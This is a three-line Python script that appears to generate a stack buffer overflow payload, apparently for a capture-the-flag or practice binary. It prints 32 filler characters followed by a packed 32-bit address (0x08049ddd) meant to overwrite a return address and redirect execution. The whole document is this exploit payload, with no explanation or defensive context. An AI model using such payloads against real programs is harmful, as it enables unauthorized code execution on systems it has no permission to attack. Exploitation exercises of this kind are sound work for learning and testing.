import struct

addrs=0x08049ddd

print(("a"*32) + (struct.pack("i",addrs)))


